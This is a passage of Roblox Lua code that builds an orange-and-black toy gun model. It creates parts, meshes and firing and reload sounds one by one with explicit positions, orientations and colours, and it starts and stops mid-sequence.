o17 = Instance.new("Part")
o17.Name = "Flash"
o17.Parent = o1
o17.Material = Enum.Material.SmoothPlastic
o17.BrickColor = BrickColor.new("Bright orange")
o17.Transparency = 1
o17.Position = Vector3.new(-113.539955, 1.41896844, 64.0666275)
o17.Rotation = Vector3.new(90.0000076, -5.12203633e-006, 180)
o17.Anchored = true
o17.CFrame = CFrame.new(-113.539955, 1.41896844, 64.0666275, -1, -1.50995419e-007, -8.93963943e-008, 8.93963801e-008, 1.04308192e-007, -1, 1.50995433e-007, -1, -1.04308178e-007)
o17.FormFactor = Enum.FormFactor.Custom
o17.Size = Vector3.new(0.216666669, 0.516666651, 0.216666669)
o17.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o17.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o17.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o17.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o17.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o17.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o17.Color = Color3.new(0.854902, 0.521569, 0.254902)
o18 = Instance.new("SpecialMesh")
o18.Parent = o17
o18.Scale = Vector3.new(2, 1.70000005, 2)
o18.MeshType = Enum.MeshType.Sphere
o19 = Instance.new("Part")
o19.Name = "Mag4"
o19.Parent = o1
o19.Material = Enum.Material.SmoothPlastic
o19.BrickColor = BrickColor.new("Neon orange")
o19.Position = Vector3.new(-113.539955, 0.229444504, 60.9571648)
o19.Rotation = Vector3.new(118.099487, 3.31188382e-010, 180)
o19.Anchored = true
o19.CFrame = CFrame.new(-113.539955, 0.229444504, 60.9571648, -1, -5.07987836e-012, 5.78032761e-012, -8.24089842e-012, 0.471000105, -0.882123709, 1.93443677e-012, -0.882123709, -0.471000105)
o19.FormFactor = Enum.FormFactor.Custom
o19.Size = Vector3.new(0.200000003, 0.349999994, 0.333333343)
o19.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o19.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o19.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o19.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o19.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o19.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o19.Color = Color3.new(0.835294, 0.45098, 0.239216)
o20 = Instance.new("BlockMesh")
o20.Parent = o19
o20.Scale = Vector3.new(0.833333373, 1, 1)
o21 = Instance.new("Part")
o21.Parent = o1
o21.Material = Enum.Material.SmoothPlastic
o21.BrickColor = BrickColor.new("Really black")
o21.Position = Vector3.new(-113.564957, 1.57731104, 61.0416603)
o21.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o21.Anchored = true
o21.CFrame = CFrame.new(-113.564957, 1.57731104, 61.0416603, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o21.FormFactor = Enum.FormFactor.Custom
o21.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o21.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o21.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o21.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o21.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o21.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o21.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o21.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o22 = Instance.new("CylinderMesh")
o22.Parent = o21
o22.Scale = Vector3.new(0.666666687, 0.333333343, 0.666666687)
o23 = Instance.new("Part")
o23.Parent = o1
o23.Material = Enum.Material.SmoothPlastic
o23.BrickColor = BrickColor.new("Neon orange")
o23.Position = Vector3.new(-113.539955, 1.48563385, 61.6083183)
o23.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o23.Anchored = true
o23.CFrame = CFrame.new(-113.539955, 1.48563385, 61.6083183, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o23.FormFactor = Enum.FormFactor.Custom
o23.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o23.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o23.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o23.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o23.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o23.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o23.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o23.Color = Color3.new(0.835294, 0.45098, 0.239216)
o24 = Instance.new("BlockMesh")
o24.Parent = o23
o24.Scale = Vector3.new(0.916666687, 0.333333343, 0.25)
o25 = Instance.new("Part")
o25.Parent = o1
o25.Material = Enum.Material.SmoothPlastic
o25.BrickColor = BrickColor.new("Really black")
o25.Position = Vector3.new(-113.639954, 1.42504084, 59.9866371)
o25.Rotation = Vector3.new(-79.9999847, -4.91393648e-010, 90)
o25.Anchored = true
o25.CFrame = CFrame.new(-113.639954, 1.42504084, 59.9866371, 7.54961107e-008, -1, -8.5764373e-012, 0.173648521, 1.31013387e-008, 0.984807789, -0.984807789, -7.43506305e-008, 0.173648506)
o25.FormFactor = Enum.FormFactor.Custom
o25.Size = Vector3.new(0.333333343, 0.200000003, 0.200000003)
o25.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o25.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o25.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o25.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o25.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o25.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o25.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o26 = Instance.new("BlockMesh")
o26.Parent = o25
o26.Scale = Vector3.new(1, 0.0833333358, 0.25)
o27 = Instance.new("Part")
o27.Parent = o1
o27.Material = Enum.Material.SmoothPlastic
o27.BrickColor = BrickColor.new("Really black")
o27.Position = Vector3.new(-113.539955, 1.54396498, 59.6333504)
o27.Rotation = Vector3.new(90.0000153, 5.00939313e-006, 180)
o27.Anchored = true
o27.CFrame = CFrame.new(-113.539955, 1.54396498, 59.6333504, -1, -2.13552136e-012, 8.74304007e-008, -8.74304007e-008, 2.68221214e-007, -1, 2.11207028e-012, -1, -2.68221214e-007)
o27.FormFactor = Enum.FormFactor.Custom
o27.Size = Vector3.new(0.200000003, 0.316666663, 0.200000003)
o27.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o27.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o27.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o27.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o27.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o27.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o27.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o28 = Instance.new("BlockMesh")
o28.Parent = o27
o28.Scale = Vector3.new(0.666666687, 1, 0.666666687)
o29 = Instance.new("Part")
o29.Parent = o1
o29.Material = Enum.Material.SmoothPlastic
o29.BrickColor = BrickColor.new("Really black")
o29.Position = Vector3.new(-113.503296, 1.67397296, 63.7049255)
o29.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o29.Anchored = true
o29.CFrame = CFrame.new(-113.503296, 1.67397296, 63.7049255, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o29.FormFactor = Enum.FormFactor.Custom
o29.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o29.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o29.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o29.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o29.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o29.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o29.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o29.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o30 = Instance.new("BlockMesh")
o30.Parent = o29
o30.Scale = Vector3.new(0.0416666679, 0.333333343, 0.116666667)
o31 = Instance.new("Part")
o31.Name = "A1"
o31.Parent = o1
o31.Material = Enum.Material.SmoothPlastic
o31.Position = Vector3.new(-113.594955, 1.53563416, 60.4333305)
o31.Rotation = Vector3.new(90.0000534, 5.02050989e-006, -180)
o31.Anchored = true
o31.CFrame = CFrame.new(-113.594955, 1.53563416, 60.4333305, -1, 1.50991113e-007, 8.76244286e-008, -8.76243078e-008, 8.19564661e-007, -1, -1.50991184e-007, -1, -8.19564661e-007)
o31.FormFactor = Enum.FormFactor.Custom
o31.Size = Vector3.new(0.200000003, 0.483333319, 0.200000003)
o31.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o31.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o31.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o31.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o31.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o31.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o32 = Instance.new("BlockMesh")
o32.Parent = o31
o32.Scale = Vector3.new(0.0833333358, 1, 0.583333313)
o33 = Instance.new("Part")
o33.Parent = o1
o33.Material = Enum.Material.SmoothPlastic
o33.BrickColor = BrickColor.new("Neon orange")
o33.Position = Vector3.new(-113.539955, 1.50229883, 61.1333237)
o33.Rotation = Vector3.new(-90, -5.40231693e-010, -180)
o33.Anchored = true
o33.CFrame = CFrame.new(-113.539955, 1.50229883, 61.1333237, -1, 2.13871629e-012, -9.42882144e-012, -9.42882057e-012, -1.19209389e-007, 1, 2.1387152e-012, 1, 1.19209389e-007)
o33.FormFactor = Enum.FormFactor.Custom
o33.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o33.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o33.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o33.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o33.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o33.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o33.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o33.Color = Color3.new(0.835294, 0.45098, 0.239216)
o34 = Instance.new("SpecialMesh")
o34.Parent = o33
o34.Scale = Vector3.new(0.916666687, 0.0833333358, 0.0833333358)
o34.MeshType = Enum.MeshType.Wedge
o35 = Instance.new("Part")
o35.Parent = o1
o35.Material = Enum.Material.SmoothPlastic
o35.BrickColor = BrickColor.new("Really black")
o35.Position = Vector3.new(-113.589958, 1.68949139, 60.6720581)
o35.Rotation = Vector3.new(92.0000153, 5.39824214e-006, -180)
o35.Anchored = true
o35.CFrame = CFrame.new(-113.589958, 1.68949139, 60.6720581, -1, 1.50990815e-007, 9.42170999e-008, -8.88901752e-008, 0.0348996483, -0.999390841, -1.54186978e-007, -0.999390841, -0.0348996483)
o35.FormFactor = Enum.FormFactor.Custom
o35.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o35.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o35.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o35.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o35.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o35.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o35.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o35.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o36 = Instance.new("BlockMesh")
o36.Parent = o35
o36.Scale = Vector3.new(0.333333343, 0.0833333358, 0.166666672)
o37 = Instance.new("Part")
o37.Parent = o1
o37.Material = Enum.Material.SmoothPlastic
o37.BrickColor = BrickColor.new("Really black")
o37.Position = Vector3.new(-113.639954, 1.31208479, 59.9074783)
o37.Rotation = Vector3.new(-79.9999847, 1.02127977e-007, 180)
o37.Anchored = true
o37.CFrame = CFrame.new(-113.639954, 1.31208479, 59.9074783, -1, -1.50989592e-007, 1.78246939e-009, 2.79745027e-008, -0.173648521, 0.984807789, -1.48386178e-007, 0.984807789, 0.173648506)
o37.FormFactor = Enum.FormFactor.Custom
o37.Size = Vector3.new(0.200000003, 0.449999988, 0.200000003)
o37.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o37.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o37.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o37.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o37.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o37.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o37.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o38 = Instance.new("SpecialMesh")
o38.Parent = o37
o38.Scale = Vector3.new(0.0833333358, 1, 0.333333343)
o38.MeshType = Enum.MeshType.Wedge
o39 = Instance.new("Part")
o39.Parent = o1
o39.Material = Enum.Material.SmoothPlastic
o39.BrickColor = BrickColor.new("Neon orange")
o39.Position = Vector3.new(-113.539955, 1.2939744, 60.8916626)
o39.Rotation = Vector3.new(-14.9999905, 9.48099853e-007, 90)
o39.Anchored = true
o39.CFrame = CFrame.new(-113.539955, 1.2939744, 60.8916626, -4.37199184e-008, -1, 1.65474638e-008, 0.965925932, -3.79474017e-008, 0.258818895, -0.258818895, 2.72991603e-008, 0.965925932)
o39.FormFactor = Enum.FormFactor.Custom
o39.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o39.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o39.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o39.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o39.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o39.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o39.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o39.Color = Color3.new(0.835294, 0.45098, 0.239216)
o40 = Instance.new("CylinderMesh")
o40.Parent = o39
o40.Scale = Vector3.new(0.666666687, 0.916666687, 0.666666687)
o41 = Instance.new("Part")
o41.Name = "Mag"
o41.Parent = o1
o41.Material = Enum.Material.SmoothPlastic
o41.BrickColor = BrickColor.new("Neon orange")
o41.Position = Vector3.new(-113.539955, 1.07309115, 60.3711433)
o41.Rotation = Vector3.new(-96.9999847, -5.9200047e-006, 180)
o41.Anchored = true
o41.CFrame = CFrame.new(-113.539955, 1.07309115, 60.3711433, -1, -1.50992278e-007, -1.03323572e-007, -1.20954695e-007, 0.12186902, 0.99254626, -1.37274853e-007, 0.99254626, -0.12186902)
o41.FormFactor = Enum.FormFactor.Custom
o41.Size = Vector3.new(0.200000003, 0.333333343, 0.50999999)
o41.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o41.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o41.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o41.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o41.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o41.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o41.Color = Color3.new(0.835294, 0.45098, 0.239216)
o42 = Instance.new("BlockMesh")
o42.Parent = o41
o42.Scale = Vector3.new(0.833333373, 1, 1)
o43 = Instance.new("Part")
o43.Name = "A2"
o43.Parent = o1
o43.Material = Enum.Material.SmoothPlastic
o43.Position = Vector3.new(-113.686623, 1.50230181, 60.6583405)
o43.Rotation = Vector3.new(90.0000076, 6.21862455e-008, -180)
o43.Anchored = true
o43.CFrame = CFrame.new(-113.686623, 1.50230181, 60.6583405, -1, 1.50991127e-007, 1.0853547e-009, -1.08533893e-009, 1.04308192e-007, -1, -1.50991127e-007, -1, -1.04308192e-007)
o43.FormFactor = Enum.FormFactor.Custom
o43.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o43.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o43.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o43.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o43.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o43.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o43.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o44 = Instance.new("BlockMesh")
o44.Parent = o43
o44.Scale = Vector3.new(0.833333373, 0.166666672, 0.25)
o45 = Instance.new("Part")
o45.Name = "Handle"
o45.Parent = o1
o45.Material = Enum.Material.SmoothPlastic
o45.BrickColor = BrickColor.new("Really black")
o45.Transparency = 1
o45.Position = Vector3.new(-113.539955, 1.01230443, 59.8150177)
o45.Rotation = Vector3.new(-179.999985, 1.15806685e-007, 180)
o45.Anchored = true
o45.CFrame = CFrame.new(-113.539955, 1.01230443, 59.8150177, -1, -1.51002368e-007, 2.02120787e-009, -1.51002368e-007, 1, 3.27825802e-007, -2.02125738e-009, 3.27825802e-007, -1)
o45.FormFactor = Enum.FormFactor.Custom
o45.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o45.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o45.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o45.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o45.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o45.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o45.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o45.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o46 = Instance.new("BlockMesh")
o46.Parent = o45
o46.Scale = Vector3.new(0.166666672, 0.75, 0.166666672)
o47 = Instance.new("Sound")
o47.Name = "Empty"
o47.Parent = o45
o47.SoundId = "rbxasset://sounds//clickfast.wav"
o47.Volume = 1
o48 = Instance.new("Sound")
o48.Name = "M1"
o48.Parent = o45
o48.Pitch = 1
o48.SoundId = "http://roblox.com/asset/?id=233931573"
o48.Volume = 1
o49 = Instance.new("Sound")
o49.Name = "M2"
o49.Pitch = 1.7
o49.Parent = o45
o49.SoundId = "http://roblox.com/asset/?id=147323220"
o49.Volume = 1
o50 = Instance.new("Sound")
o50.Name = "Fire"
o50.Parent = o45
o50.Pitch = 1.25
o50.Volume = 4
o50.SoundId = "http://roblox.com/asset/?id=258193800"
o50.PlayOnRemove = true
o51 = Instance.new("Sound")
o51.Name = "M3"
o51.Parent = o45
o51.SoundId = "http://roblox.com/asset/?id=152206337"
o51.Volume = 1
o51.PlayOnRemove = true
o53 = Instance.new("Part")
o53.Name = "Mag2"
o53.Parent = o1
o53.Material = Enum.Material.SmoothPlastic
o53.BrickColor = BrickColor.new("Neon orange")
o53.Position = Vector3.new(-113.539955, 0.701820016, 60.4757118)
o53.Rotation = Vector3.new(-117.412865, -4.27430313e-010, 180)
o53.Anchored = true
o53.CFrame = CFrame.new(-113.539955, 0.701820016, 60.4757118, -1, -1.888052e-012, -7.46006642e-012, -8.24089842e-012, 0.460395187, 0.88770467, 1.93443677e-012, 0.88770467, -0.460395187)
o53.FormFactor = Enum.FormFactor.Custom
o53.Size = Vector3.new(0.200000003, 0.333333343, 0.400000006)
o53.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o53.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o53.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o53.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o53.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o53.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o53.Color = Color3.new(0.835294, 0.45098, 0.239216)
o54 = Instance.new("BlockMesh")
o54.Parent = o53
o54.Scale = Vector3.new(0.833333373, 1, 1)
o55 = Instance.new("Part")
o55.Name = "Mag3"
o55.Parent = o1
o55.Material = Enum.Material.SmoothPlastic
o55.BrickColor = BrickColor.new("Neon orange")
o55.Position = Vector3.new(-113.539955, 0.422861636, 60.6890869)
o55.Rotation = Vector3.new(133.099686, 2.44571335e-010, 180)
o55.Anchored = true
o55.CFrame = CFrame.new(-113.539955, 0.422861636, 60.6890869, -1, -6.40285958e-012, 4.26857508e-012, -8.24089842e-012, 0.683264196, -0.730159819, 1.93443677e-012, -0.730159819, -0.683264196)
o55.FormFactor = Enum.FormFactor.Custom
o55.Size = Vector3.new(0.200000003, 0.449999988, 0.333333343)
o55.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o55.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o55.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o55.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o55.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o55.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o55.Color = Color3.new(0.835294, 0.45098, 0.239216)
o56 = Instance.new("BlockMesh")
o56.Parent = o55
o56.Scale = Vector3.new(0.833333373, 1, 1)
o57 = Instance.new("Part")
o57.Parent = o1
o57.Material = Enum.Material.SmoothPlastic
o57.BrickColor = BrickColor.new("Really black")
o57.Position = Vector3.new(-113.539955, 1.20230353, 59.8150177)
o57.Rotation = Vector3.new(-179.999985, 1.15806685e-007, 180)
o57.Anchored = true
o57.CFrame = CFrame.new(-113.539955, 1.20230353, 59.8150177, -1, -1.51002368e-007, 2.02120787e-009, -1.51002368e-007, 1, 3.27825802e-007, -2.02125738e-009, 3.27825802e-007, -1)
o57.FormFactor = Enum.FormFactor.Custom
o57.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o57.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o57.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o57.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o57.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o57.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o57.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o57.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o58 = Instance.new("BlockMesh")
o58.Parent = o57
o58.Scale = Vector3.new(0.166666672, 0.75, 0.166666672)
o59 = Instance.new("Sound")
o59.Name = "Empty"
o59.Parent = o57
o59.SoundId = "rbxasset://sounds//clickfast.wav"
o59.Volume = 1
o60 = Instance.new("Sound")
o60.Name = "M1"
o60.Parent = o57
o60.Pitch = 1
o60.SoundId = "http://roblox.com/asset/?id=233931573"
o60.Volume = 1
o61 = Instance.new("Sound")
o61.Name = "M2"
o61.Parent = o57
o61.Pitch = 1.7
o61.SoundId = "http://roblox.com/asset/?id=147323220"
o61.Volume = 1
o62 = Instance.new("Sound")
o62.Name = "Fire"
o62.Parent = o57
o62.Pitch = 1.25
o62.SoundId = "http://roblox.com/asset/?id=258193800"
o62.PlayOnRemove = true
o62.Volume = 4
o63 = Instance.new("Sound")
o63.Name = "M3"
o63.Parent = o57
o63.SoundId = "http://roblox.com/asset/?id=10209881"
o63.Volume = 1
o63.PlayOnRemove = true
o64 = Instance.new("Part")
o64.Parent = o1
o64.Material = Enum.Material.SmoothPlastic
o64.BrickColor = BrickColor.new("Neon orange")
o64.Position = Vector3.new(-113.539955, 1.50229979, 61.2999878)
o64.Rotation = Vector3.new(-89.9999924, -5.01429398e-010, 1.22437713e-010)
o64.Anchored = true
o64.CFrame = CFrame.new(-113.539955, 1.50229979, 61.2999878, 1, -2.13694123e-012, -8.75159407e-012, 8.75159493e-012, 2.38418806e-007, 1, -2.13693885e-012, -1, 2.38418806e-007)
o64.FormFactor = Enum.FormFactor.Custom
o64.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o64.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o64.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o64.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o64.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o64.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o64.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o64.Color = Color3.new(0.835294, 0.45098, 0.239216)
o65 = Instance.new("SpecialMesh")
o65.Parent = o64
o65.Scale = Vector3.new(0.916666687, 0.0833333358, 0.0833333358)
o65.MeshType = Enum.MeshType.Wedge
o66 = Instance.new("Part")
o66.Parent = o1
o66.Material = Enum.Material.SmoothPlastic
o66.BrickColor = BrickColor.new("Neon orange")
o66.Position = Vector3.new(-113.5373, 0.891278505, 58.2646141)
o66.Rotation = Vector3.new(-180, -2.50457879e-006, -4.2913037e-010)
o66.Anchored = true
o66.CFrame = CFrame.new(-113.5373, 0.891278505, 58.2646141, 1, 7.489738e-012, -4.37131469e-008, 8.24089842e-012, -0.999991596, 4.37110295e-008, -4.3712955e-008, -4.37110295e-008, -0.999991596)
o66.CanCollide = false
o66.FormFactor = Enum.FormFactor.Symmetric
o66.Size = Vector3.new(1, 1, 1)
o66.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o66.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o66.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o66.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o66.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o66.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o66.Color = Color3.new(0.835294, 0.45098, 0.239216)
o67 = Instance.new("SpecialMesh")
o67.Parent = o66
o67.Scale = Vector3.new(0.192307696, 0.0384615399, 0.653846145)
o67.MeshType = Enum.MeshType.Wedge
o68 = Instance.new("Part")
o68.Parent = o1
o68.Material = Enum.Material.SmoothPlastic
o68.BrickColor = BrickColor.new("Really black")
o68.Position = Vector3.new(-113.539955, 1.49396372, 62.1166382)
o68.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o68.Anchored = true
o68.CFrame = CFrame.new(-113.539955, 1.49396372, 62.1166382, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o68.FormFactor = Enum.FormFactor.Custom
o68.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o68.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o68.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o68.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o68.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o68.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o68.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o68.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o69 = Instance.new("BlockMesh")
o69.Parent = o68
o69.Scale = Vector3.new(0.333333343, 0.0833333358, 0.666666687)
o70 = Instance.new("Part")
o70.Parent = o1
o70.Material = Enum.Material.SmoothPlastic
o70.BrickColor = BrickColor.new("Neon orange")
o70.Position = Vector3.new(-113.539955, 1.11064351, 59.6583519)
o70.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o70.Anchored = true
o70.CFrame = CFrame.new(-113.539955, 1.11064351, 59.6583519, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o70.FormFactor = Enum.FormFactor.Custom
o70.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o70.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o70.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o70.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o70.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o70.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o70.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o70.Color = Color3.new(0.835294, 0.45098, 0.239216)
o71 = Instance.new("BlockMesh")
o71.Parent = o70
o71.Scale = Vector3.new(0.916666687, 0.5, 0.333333343)
o72 = Instance.new("Part")
o72.Parent = o1
o72.Material = Enum.Material.SmoothPlastic
o72.BrickColor = BrickColor.new("Neon orange")
o72.Position = Vector3.new(-113.539955, 1.50229979, 61.5666542)
o72.Rotation = Vector3.new(-89.9999924, -4.79929207e-010, 1.22844804e-010)
o72.Anchored = true
o72.CFrame = CFrame.new(-113.539955, 1.50229979, 61.5666542, 1, -2.14404623e-012, -8.37634476e-012, 8.37634562e-012, 2.23517574e-007, 1, -2.14404427e-012, -1, 2.23517588e-007)
o72.FormFactor = Enum.FormFactor.Custom
o72.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o72.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o72.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o72.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o72.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o72.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o72.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o72.Color = Color3.new(0.835294, 0.45098, 0.239216)
o73 = Instance.new("SpecialMesh")
o73.Parent = o72
o73.Scale = Vector3.new(0.916666687, 0.0833333358, 0.0833333358)
o73.MeshType = Enum.MeshType.Wedge
o74 = Instance.new("Part")
o74.Parent = o1
o74.Material = Enum.Material.SmoothPlastic
o74.BrickColor = BrickColor.new("Really black")
o74.Position = Vector3.new(-113.539955, 1.06898797, 59.508358)
o74.Rotation = Vector3.new(-89.9999924, -5.20843257e-010, 1.22437671e-010)
o74.Anchored = true
o74.CFrame = CFrame.new(-113.539955, 1.06898797, 59.508358, 1, -2.13694058e-012, -9.0904298e-012, 9.0904298e-012, 1.63912873e-007, 1, -2.13693885e-012, -1, 1.63912887e-007)
o74.FormFactor = Enum.FormFactor.Custom
o74.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
